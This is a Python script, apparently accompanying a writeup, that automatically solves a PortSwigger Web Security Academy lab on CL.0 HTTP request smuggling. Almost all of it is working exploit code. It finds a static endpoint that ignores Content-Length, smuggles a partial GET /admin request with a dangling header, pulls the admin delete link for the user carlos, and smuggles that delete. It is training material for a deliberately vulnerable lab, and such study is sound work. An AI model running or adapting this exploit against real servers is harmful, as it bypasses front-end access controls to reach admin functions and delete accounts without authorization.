#!/usr/bin/env python3
"""
CL.0 request smuggling
PortSwigger Web Security Academy -- HTTP Request Smuggling

Companion script for the writeup: 13-cl-0-request-smuggling.md

What this does:
    Scans the static resource paths linked from the homepage for one that
    ignores Content-Length entirely -- a much easier condition to find than
    a classic CL/TE disagreement, because static file handlers were never
    written to expect a POST body worth parsing. Once a vulnerable endpoint
    is found, smuggles an incomplete "GET /admin HTTP/1.1\\r\\nX-Ignore: "
    prefix -- ending in a dangling header rather than a complete request --
    so the next real request's own request line and headers get absorbed
    into that header's value instead of starting a fresh request. That
    avoids the duplicate-Host-header rejection a self-contained smuggled
    request would trigger. Extracts the admin delete link for carlos from
    the merged response, then repeats the same pattern against the delete
    path.

Usage:
    python 13-cl-0-request-smuggling.py <lab-url>
    e.g. python 13-cl-0-request-smuggling.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import socket
import ssl
import sys
from urllib.parse import urlparse

import httpx


def create_ssl_connection(host: str, port: int = 443, timeout: float = 10.0) -> ssl.SSLSocket:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["http/1.1"])
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return ctx.wrap_socket(sock, server_hostname=host)


def send_raw_keep_alive(host: str, payloads: list[bytes], port: int = 443,
                         timeout: float = 10.0, delay: float = 0.5) -> list[bytes]:
    import time
    ssl_sock = create_ssl_connection(host, port, timeout)
    responses = []
    try:
        for payload in payloads:
            ssl_sock.sendall(payload)
            time.sleep(delay)
            response = b""
            ssl_sock.settimeout(2.0)
            while True:
                try:
                    chunk = ssl_sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            responses.append(response)
        return responses
    finally:
        ssl_sock.close()


def read_one_response(ssl_sock: ssl.SSLSocket) -> bytes:
    """Read exactly one HTTP response off the socket using Content-Length,
    so the follow-up send below doesn't race the static file's own body."""
    data = b""
    ssl_sock.settimeout(5)
    while b"\r\n\r\n" not in data:
        chunk = ssl_sock.recv(4096)
        if not chunk:
            return data
        data += chunk
    hdrs = data.split(b"\r\n\r\n")[0]
    body_start = data.index(b"\r\n\r\n") + 4
    cl_m = re.search(rb"Content-Length:\s*(\d+)", hdrs, re.I)
    if cl_m:
        needed = int(cl_m.group(1))
        while len(data) - body_start < needed:
            chunk = ssl_sock.recv(4096)
            if not chunk:
                break
            data += chunk
    return data


def build_cl0_payload(host: str, endpoint: str, smuggled_prefix: str) -> tuple[bytes, bytes]:
    """smuggled_prefix must NOT end with \\r\\n\\r\\n -- the follow-up request
    completes it. Returns (poison_request, follow_up_request)."""
    poison = (
        f"POST {endpoint} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: keep-alive\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(smuggled_prefix)}\r\n"
        f"\r\n"
        f"{smuggled_prefix}"
    ).encode()
    follow_up = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    return poison, follow_up


def build_cl0_probe(host: str, endpoint: str) -> tuple[bytes, bytes]:
    smuggled = "GET /hopefully404 HTTP/1.1\r\nFoo: x"
    return build_cl0_payload(host, endpoint, smuggled)


def exploit_cl0_sync(host: str, endpoint: str, smuggled_path: str, port: int = 443) -> bytes:
    smuggled = f"GET {smuggled_path} HTTP/1.1\r\nX-Ignore: "
    poison, follow_up = build_cl0_payload(host, endpoint, smuggled)

    s = create_ssl_connection(host, port)
    s.settimeout(5)
    s.sendall(poison)
    read_one_response(s)  # consume the static file's own response first
    s.sendall(follow_up)

    r2 = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            r2 += chunk
    except socket.timeout:
        pass
    s.close()
    return r2


def get_response_body(response: bytes) -> str:
    parts = response.split(b"\r\n\r\n", 1)
    return parts[1].decode(errors="replace") if len(parts) > 1 else ""


def find_delete_link(body: str, username: str = "carlos") -> str | None:
    m = re.search(rf'href="([^"]*delete[^"]*username={username}[^"]*)"', body)
    if m:
        return m.group(1)
    m = re.search(rf'(/admin/delete\?username={username})', body)
    return m.group(1) if m else None


def solve(lab_url: str) -> None:
    host = urlparse(lab_url).hostname

    r = httpx.get(lab_url + "/", verify=False)
    static_paths = list(set(re.findall(r'(?:href|src)="(/resources/[^"]+)"', r.text)))[:5]
    print(f"[*] Candidate static resource paths: {static_paths}")

    vuln_ep = None
    for ep in static_paths:
        poison, follow_up = build_cl0_probe(host, ep)
        try:
            responses = send_raw_keep_alive(host, [poison, follow_up], delay=0.5)
        except Exception as e:
            print(f"[!] {ep}: {e}")
            continue
        if len(responses) >= 2 and b"404" in responses[1]:
            vuln_ep = ep
            print(f"[+] CL.0 vulnerable endpoint: {ep}")
            break

    if not vuln_ep:
        print("[-] No CL.0 endpoint found among the scanned static paths.")
        return

    resp = exploit_cl0_sync(host, vuln_ep, "/admin")
    body = get_response_body(resp)
    delete_link = find_delete_link(body)
    print(f"[*] Delete link: {delete_link}")

    if delete_link:
        exploit_cl0_sync(host, vuln_ep, delete_link)
        print("[+] Sent smuggled delete request for carlos.")
    else:
        print("[-] Could not find carlos's delete link in the smuggled admin panel response.")

    check = httpx.get(lab_url + "/", verify=False)
    if "is-solved" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Lab not yet marked solved.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
